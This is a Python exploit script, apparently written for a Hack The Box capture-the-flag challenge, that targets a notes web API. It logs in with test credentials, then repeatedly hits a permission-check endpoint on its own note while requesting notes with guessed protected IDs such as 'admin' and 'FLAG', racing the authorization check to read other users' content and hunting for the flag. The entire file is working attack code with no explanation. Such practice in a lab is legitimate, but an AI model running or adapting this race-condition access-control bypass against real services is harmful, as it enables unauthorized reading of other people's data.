#!/usr/bin/env python3
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import time

BASE_URL = "http://83.136.255.203:47148"

# Create session with connection pooling
session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.1)
adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
session.mount('http://', adapter)
session.mount('https://', adapter)

# Login
r = session.post(f"{BASE_URL}/api/auth/login", 
                json={"email": "test@test.com", "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_notes = session.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes']
my_note = my_notes[0]['id']

print(f"[*] Using persistent session")
print(f"[*] My note: {my_note}")

# Protected IDs
targets = ["administrator", "htb", "hidden", "d3vnu11", "FLAG", "admin"]

for target in targets:
    print(f"\n[*] Target: {target}")
    
    for i in range(100):
        # Use same session
        session.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
        r = session.get(f"{BASE_URL}/api/notes/{target}", headers=headers)
        result = r.json()
        
        if result.get('success'):
            content = result.get('note', {}).get('content', '')
            if 'HTB{' in content:
                print(f"\n[!!!] FLAG: {content}")
                exit(0)
            elif content and content != 'test':
                print(f"  Got: {content}")
                break

print("\n[*] No flag")
